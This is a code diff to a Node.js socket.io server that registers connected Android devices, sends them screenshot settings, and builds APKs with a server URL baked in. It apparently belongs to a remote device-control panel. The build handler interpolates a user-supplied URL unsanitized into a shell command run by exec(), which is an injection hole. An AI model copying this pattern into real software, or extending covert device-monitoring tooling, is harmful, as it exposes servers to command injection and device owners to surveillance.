@@ -147,6 +147,17 @@ androidIo.on("connection", async (socket) => {
 
         console.log(chalk.green(`[+] Android device Connected (${deviceUuid}) => ${socket.request.connection.remoteAddress}:${socket.request.connection.remotePort}`))
 
+        // Send default config data to Android device as first message
+        const defaultConfig = {
+            socket_url: `http://${socket.request.connection.remoteAddress}:4000`,
+            config_url: `http://${socket.request.connection.remoteAddress}:4001`,
+            screenshot_quality: 70,
+            auto_screenshot: false
+        };
+        console.log(chalk.blue(`[i] url de socket http://${socket.request.connection.remoteAddress}:4000`));
+        socket.emit("config_data", defaultConfig);
+        console.log(chalk.blue(`[i] Sent default config to device ${deviceUuid}:`, defaultConfig));
+
         // Broadcast updated device list to frontend
         const deviceList = Array.from(devices.values()).map((d) => ({
             ...d.info,
@@ -519,12 +530,12 @@ frontendIo.on("connection", async (socket) => {
     });
 
     socket.on("build_request", async (data) => {
-        const { configUrl } = data;
-        console.log(`Build request for config URL: ${configUrl}`);
+        const { serverUrl } = data;
+        console.log(`Build request for server URL: ${serverUrl}`);
 
-        frontendIo.emit("build_started", { configUrl });
+        frontendIo.emit("build_started", { serverUrl });
 
-        const command = `cd /android-project && ./gradlew assembleRelease -PconfigUrl='${configUrl}' --no-daemon --stacktrace`;
+        const command = `cd /android-project && ./gradlew assembleRelease -PserverUrl='${serverUrl}' --no-daemon --stacktrace`;
         
         exec(command, { cwd: '/android-project' }, (error, stdout, stderr) => {
             if (error) {
